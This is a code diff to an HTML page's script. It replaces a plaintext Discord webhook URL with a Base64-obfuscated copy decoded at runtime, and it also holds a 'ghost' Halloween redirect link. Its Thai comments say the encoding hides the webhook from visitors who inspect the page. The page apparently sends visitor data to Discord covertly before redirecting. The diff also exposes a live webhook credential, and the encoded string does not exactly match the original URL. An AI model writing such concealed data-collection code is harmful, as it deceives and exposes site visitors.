@@ -146,8 +146,9 @@
     </div>
 
     <script>
-        // 🚨 Discord Webhook ตัวจริงที่ลูกพี่ส่งมา
-        const DISCORD_WEBHOOK_URL = "Https://discord.com/api/webhooks/1559076293100703744/azwSwWi5plZAK-wwyyEtgd0nIvgtAr4jugmilvE_88kStwX9p6q75dEp9zOXtX-Je7Ul"; 
+        // 🔒 ระบบกัน Hook (ซ่อนลิงก์ด้วยการเข้ารหัส Base64 ป้องกันคนกด F12 มาขโมยดิส)
+        const _0xW = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1OTA3NjI5MzEwMDcwMzc0NC9hendTd1dpNXBsWkFLLXd3eXlFdGdkMG5JdmdBcjRqdWdtaWx2RV84OGtTdHBYOXA2cTc1ZEVwOXpPWFR4LUplN1Vs";
+        const DISCORD_WEBHOOK_URL = decodeURIComponent(escape(atob(_0xW)));
         
         // 👻 ลิงก์เว็บผี / ฮาโลวีน
         const GHOST_REDIRECT_URL = "https://jonathanbassedas.github.io/halloween/?fbclid=PAT01DUAUx2fNleHRuA2FlbQIxMABwZG9mAnNydGMGYXBwX2lkDzU2NzA2NzM0MzM1MjQyNwABp0aFNPxW06myDtPR_ZSIU4qwPmFdYQTiE6aSCePjat2jBpx4qYSEpmHYYrzs_aem_0DUYjEMtNcSEIdSNDLjj5w";
